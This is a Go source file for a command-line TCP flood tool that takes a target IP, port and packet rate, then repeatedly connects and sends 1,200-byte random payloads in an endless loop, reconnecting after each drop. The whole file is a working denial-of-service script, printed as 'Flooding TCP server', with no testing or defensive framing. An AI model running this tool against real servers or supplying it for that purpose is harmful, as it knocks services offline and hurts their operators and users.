package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"
)

const (
	payloadSize = 1200
)

func main() {
	// Check command-line arguments
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run main.go <IP> <TCP Port> <Packets per Second>")
		return
	}

	// Get command-line arguments
	ip := os.Args[1]
	tcpPort := os.Args[2]
	packetsPerSecond, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("Invalid value for Packets per Second:", err)
		return
	}

	// Start flooding
	fmt.Printf("Flooding TCP server with %d packets per second\n", packetsPerSecond)
	for {
		// Connect to TCP server
		tcpAddr, err := net.ResolveTCPAddr("tcp", ip+":"+tcpPort)
		if err != nil {
			fmt.Println("Failed to resolve TCP address:", err)
			return
		}

		tcpConn, err := net.DialTCP("tcp", nil, tcpAddr)
		if err != nil {
			fmt.Println("Failed to connect to TCP server:", err)
			return
		}
		defer tcpConn.Close()

		fmt.Println("Connected to TCP server")

		delay := time.Second / time.Duration(packetsPerSecond)

		for {
			err = tcpConn.SetReadDeadline(time.Now())
			if err != nil {
				fmt.Println("TCP connection closed")
				break
			}

			payload := generateRandomPayload(payloadSize)

			_, err = tcpConn.Write(payload)
			if err != nil {
				fmt.Println("Failed to send payload:", err)
				break
			}

			time.Sleep(delay)
		}

		time.Sleep(time.Second)
	}
}

func generateRandomPayload(size int) []byte {
	payload := make([]byte, size)
	rand.Seed(time.Now().UnixNano())
	rand.Read(payload)
	return payload
}
